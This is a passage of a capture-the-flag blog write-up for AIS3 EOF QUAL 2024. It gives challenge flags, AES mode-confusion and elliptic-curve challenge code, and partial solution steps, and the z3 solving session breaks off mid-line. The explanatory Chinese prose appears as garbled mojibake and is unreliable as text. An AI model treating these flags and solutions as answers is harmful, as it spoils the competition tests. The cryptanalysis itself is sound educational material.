<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="AIS3 EOF QUAL 2024 Write UpBefore allUser Name: Whale120Rank:61   ä¸­é–“æ’åé£„ä¾†é£„å»çš„è‘—å¯¦å¯æ€•ï¼Œä¸éé€™å ´æ¯”è³½çš„é¡Œç›®éƒ½å¥½æœ‰è¶£wwwã€‚   æˆ‘ç¸½å…±è§£äº†å…©é¡ŒWebä¸‰é¡ŒCryptoï¼Œæ•´å€‹æˆ°é¬¥åŠ›åˆ°ç¬¬ä¸‰å¤©å°±ä¸‹æ»‘ï¼Œåªæƒ³åˆ°äº†Baby RSAçš„unintendedè§£ï¼Œé‚„æœ‰å¾ˆå¤šè¦å­¸ï¼ŒåŠ æ²¹owobã€‚   Write UpMISCWelcomeå’¦ï¼ŒDC An">
<meta property="og:type" content="article">
<meta property="og:title" content="AIS3 EOF QUAL 2024 Write Up">
<meta property="og:url" content="http://wha13.github.io/2024/01/10/EOFQUAL2023/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="AIS3 EOF QUAL 2024 Write UpBefore allUser Name: Whale120Rank:61   ä¸­é–“æ’åé£„ä¾†é£„å»çš„è‘—å¯¦å¯æ€•ï¼Œä¸éé€™å ´æ¯”è³½çš„é¡Œç›®éƒ½å¥½æœ‰è¶£wwwã€‚   æˆ‘ç¸½å…±è§£äº†å…©é¡ŒWebä¸‰é¡ŒCryptoï¼Œæ•´å€‹æˆ°é¬¥åŠ›åˆ°ç¬¬ä¸‰å¤©å°±ä¸‹æ»‘ï¼Œåªæƒ³åˆ°äº†Baby RSAçš„unintendedè§£ï¼Œé‚„æœ‰å¾ˆå¤šè¦å­¸ï¼ŒåŠ æ²¹owobã€‚   Write UpMISCWelcomeå’¦ï¼ŒDC An">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/B1cHY5Ldp.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hki1AAPua.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJnn7yDd6.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJjtVJvOT.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyRE_kd_p.png">
<meta property="article:published_time" content="2024-01-11T03:31:04.000Z">
<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="Command Injection">
<meta property="article:tag" content="ECC">
<meta property="article:tag" content="CTR">
<meta property="article:tag" content="CFB">
<meta property="article:tag" content="OFB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/B1cHY5Ldp.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AIS3 EOF QUAL 2024 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/02/05/2024EOFFINAL/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/12/31/2023FINAL/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/01/10/EOFQUAL2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&text=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&is_video=false&description=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF QUAL 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/01/10/EOFQUAL2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&name=AIS3 EOF QUAL 2024 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/01/10/EOFQUAL2023/&t=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AIS3-EOF-QUAL-2024-Write-Up"><span class="toc-number">1.</span> <span class="toc-text">AIS3 EOF QUAL 2024 Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">1.2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">1.2.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Welcome</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.2.2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-AES"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Baby AES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-ECDLP"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Baby ECDLP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-RSA"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">Baby RSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.2.3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Lookup-Tool-Final"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">DNS Lookup Tool: Final</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Internal"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Internal</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">1.3.</span> <span class="toc-text">After all</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AIS3 EOF QUAL 2024 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-01-11T03:31:04.000Z" class="dt-published" itemprop="datePublished">2024-01-10</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CFB/" rel="tag">CFB</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/CTR/" rel="tag">CTR</a>, <a class="p-category" href="/tags/Command-Injection/" rel="tag">Command Injection</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/ECC/" rel="tag">ECC</a>, <a class="p-category" href="/tags/OFB/" rel="tag">OFB</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="AIS3-EOF-QUAL-2024-Write-Up"><a href="#AIS3-EOF-QUAL-2024-Write-Up" class="headerlink" title="AIS3 EOF QUAL 2024 Write Up"></a>AIS3 EOF QUAL 2024 Write Up</h1><h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>User Name: Whale120<br>Rank:61  </p>
<p>ä¸­é–“æ’åé£„ä¾†é£„å»çš„è‘—å¯¦å¯æ€•ï¼Œä¸éé€™å ´æ¯”è³½çš„é¡Œç›®éƒ½å¥½æœ‰è¶£wwwã€‚  </p>
<p>æˆ‘ç¸½å…±è§£äº†å…©é¡ŒWebä¸‰é¡ŒCryptoï¼Œæ•´å€‹æˆ°é¬¥åŠ›åˆ°ç¬¬ä¸‰å¤©å°±ä¸‹æ»‘ï¼Œåªæƒ³åˆ°äº†Baby RSAçš„unintendedè§£ï¼Œé‚„æœ‰å¾ˆå¤šè¦å­¸ï¼ŒåŠ æ²¹owobã€‚  </p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h4><p>å’¦ï¼ŒDC Announcementå°±æœ‰ã„ŒXD  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AIS3 EOF 2024 Qualification Start!!!</span><br><span class="line">Welcome Flag: AIS3&#123;W3lc0mE_T0_A1S5s_EOF_2o24&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="Baby-AES"><a href="#Baby-AES" class="headerlink" title="Baby AES"></a>Baby AES</h4><p><strong>AES.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b, bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOR</span> (a, b):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(a) ^ b2l(b)).rjust(<span class="built_in">len</span>(a), <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">counter_add</span>(<span class="params">iv</span>):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(iv) + <span class="number">1</span>).rjust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># These modes of Block Cipher are just like Stream Cipher. Do you know them?</span></span><br><span class="line">AES_enc = AES.new(urandom(<span class="number">16</span>), AES.MODE_ECB).encrypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        _ct = XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = _ct</span><br><span class="line">        ct += _ct</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_OFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        iv = AES_enc(iv)</span><br><span class="line">        ct += XOR(iv, pt[i : i + <span class="number">16</span>])</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CTR</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        ct += XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = counter_add(iv)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    counter = urandom(<span class="number">16</span>)</span><br><span class="line">    c1 = urandom(<span class="number">32</span>)</span><br><span class="line">    c2 = urandom(<span class="number">32</span>)</span><br><span class="line">    c3 = XOR(XOR(c1, c2), FLAG)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c1_CFB: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_CFB(counter, c1))&#125;</span>)&quot;</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c2_OFB: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_OFB(counter, c2))&#125;</span>)&quot;</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c3_CTR: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_CTR(counter, c3))&#125;</span>)&quot;</span> )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            counter = counter_add(counter)</span><br><span class="line">            mode = <span class="built_in">input</span>(<span class="string">&quot;What operation mode do you want for encryption? &quot;</span>)</span><br><span class="line">            pt = b64decode(<span class="built_in">input</span>(<span class="string">&quot;What message do you want to encrypt (in base64)? &quot;</span>))</span><br><span class="line">            pt = pt.ljust( ((<span class="built_in">len</span>(pt) - <span class="number">1</span>) // <span class="number">16</span> + <span class="number">1</span>) * <span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&quot;CFB&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">&quot;OFB&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_OFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">&quot;CTR&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CTR(counter, pt)) )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Sorry, I don&#x27;t understand.&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;??&quot;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<p>é¡Œç›®æœƒè®“ä½ ncä¸Šserverï¼Œç„¶å¾Œåœ¨æä¾›counterçš„æƒ…æ³ä¸‹çµ¦ä½ c1, c2, c3åˆ†åˆ¥ç”¨CFB, OFB, CTRæ¨¡å¼åŠ å¯†çš„å¯†æ–‡ï¼Œæœ€å¾Œå…è¨±ä½ æ“ä½œåŠ å¯†äº”æ¬¡ã€‚<br>çœ‹åˆ°é€™è£¡ï¼Œæˆ‘çš„æ€è·¯å°±è®Šæˆï¼šæ€éº¼åˆ©ç”¨å®ƒçµ¦çš„æ±è¥¿å°‡è™•ç†c1, c2, c3æ™‚è¢«åŠ å¯†çš„counter valueç®—å‡ºä¾†ã€‚<br>é€™é‚Šå°‡åˆå§‹counterå®šç¾©ç‚º<code>ct0</code>ï¼Œæ¥è‘—ä¾åºç‚º<code>ct1</code>, <code>ct2</code>â€¦â€¦<br>è§€å¯ŸOFB, CFB, CTRæ¨¡å¼å¯ä»¥å¾—åˆ°ï¼š<br>è§£é–‹<code>c1</code>æ‰€éœ€è¦çš„åƒæ•¸ç‚º<code>ECB</code>åŠ å¯†å¾Œçš„<code>ct0</code> valueåŠ ä¸Šç¬¬ä¸€æ¬¡å›å‚³çš„è¢«åŠ å¯†å€¼å‰åå…­byteç”¨<code>ECB</code>åŠ å¯†å¾Œçš„çµæœ<br>è§£é–‹<code>c2</code>æ‰€éœ€è¦çš„åƒæ•¸ç‚º<code>ECB</code>åŠ å¯†å¾Œçš„<code>ct1</code> valueä»¥åŠç”¨<code>ECB</code>åŠ å¯†å…©æ¬¡å¾Œçš„<code>ct1</code> value<br>è§£é–‹<code>c3</code>æ‰€éœ€è¦çš„åƒæ•¸ç‚º<code>ECB</code>åŠ å¯†å¾Œçš„<code>ct2</code>èˆ‡<code>ct3</code><br>æ¥è‘—åªéœ€è¦åˆ©ç”¨CTRç›´æ¥ç²å–èˆ‡CFB bit flippingæ‹¿åŠ å¯†å¾Œçš„counter valueå³å¯ã€‚<br>p.s.æˆ‘æ˜¯ç›´æ¥ncä¸Šå¾Œç”¨pythonæ‰‹æ‰“æ‰€ä»¥æ²’æœ‰script :D<br>Solution:  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)CTR:<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">80</span> -&gt; ç²å¾— ct3 ~ ct7åŠ å¯†å¾Œçš„å€¼ï¼Œç¨±ç‚ºENC(ct3), ENC(ct4)......</span><br><span class="line">(<span class="number">2</span>)CFB:ENC(ct4)^ct1+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">32</span> -&gt; ç²å¾—ct1+ENC(ct1)+ENC(ENC(ct1))</span><br><span class="line">(<span class="number">3</span>)CFB:ENC(ct5)^ct2+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span> -&gt; ç²å¾— ct2+ENC(ct2)</span><br><span class="line">(<span class="number">4</span>)CFB:ENC(ct6)^ct0+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span> -&gt; ç²å¾— ct0+ENC(ct0)</span><br><span class="line">(<span class="number">5</span>)CFB:ENC(ct7)^c0åŠ å¯†å¾Œçš„å‰16<span class="built_in">bytes</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span> -&gt; c0åŠ å¯†å¾Œçš„å‰16<span class="built_in">bytes</span> + ENC(c0åŠ å¯†å¾Œçš„å‰16<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œå„ç¨®xorç®—å›å»å°±å¥½äº†~  </p>
<p><img src="https://hackmd.io/_uploads/B1cHY5Ldp.png" alt="EOF2023QUAL-AES">  </p>
<h4 id="Baby-ECDLP"><a href="#Baby-ECDLP" class="headerlink" title="Baby ECDLP"></a>Baby ECDLP</h4><p><strong>chall.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line">n = p * q</span><br><span class="line">a, b = matrix(ZZ, [[p, <span class="number">1</span>], [q, <span class="number">1</span>]]).solve_right(</span><br><span class="line">    vector([p**<span class="number">2</span> - p**<span class="number">3</span>, q**<span class="number">2</span> - q**<span class="number">3</span>])</span><br><span class="line">)</span><br><span class="line">E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">G = E(p, p) + E(q, q)</span><br><span class="line">C = bytes_to_long(flag) * G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C =&quot;</span>, C.xy())</span><br></pre></td></tr></table></figure>
<p><strong>output.txt</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = -1049512290645561483277399447040672259507710914145558231422452159145941450861058912834056552784840698307176425328594627265181382568207073595223799102540059103656850409121714215271402071402990265653829990643814289333297114436290307127182601793045470624406368512814269833830187545236393724608995894644699923989</span><br><span class="line">b = 330613225413866308562655832653992432640737790102976283577689980446254238304479688134993945656361409867735093176372274589048066502491030816811279723518019832240148759433890104257541015694288688653084062998961288644429744942281764740765767448933787468732728303440425139427370295303413074746846731173227818565326124721081874768870022303341674817123171380954083010086565749443463586594318218908360567200188035652004143989131725183710453256926775457844063169319469</span><br><span class="line">C = (267111004965766851197295766324872918045366663010386225569683352174816889947153426038920564765985480495027226192426180920889404710714177330839745847098719253913784748674975923941362014119630482337688147428774108074983765342590544406095084448586154162465772821665560547734890209137946668822330843444608421730, 121650402415930828032211963598144915558171373162163617470672182014503810780161804477407976153593724606514937006081912867636117646613415693478218365932212102557909492288758305287088882502760464160705341780505639501694329242419144215441270993917308948949819834611451749926628000691771375822508363489298910865)</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆï¼Œåˆ©ç”¨çµ¦å®šçš„aå’Œbç®—på’Œq<br>ç›´æ¥<code>z3</code>XD  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=Solver()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x, y=Ints(<span class="string">&quot;x, y&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(x&gt;<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(y&gt;<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(x!=y)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = -<span class="number">1049512290645561483277399447040672259507710914145558231422452159145941450861058912834056552784840698307176425328594627265181382568207073595223799102540059103656850409121714215271402071402990265653829990643814289333297114436290307127182601793045470624406368512814269833830187545236393724608995894644699923989</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span 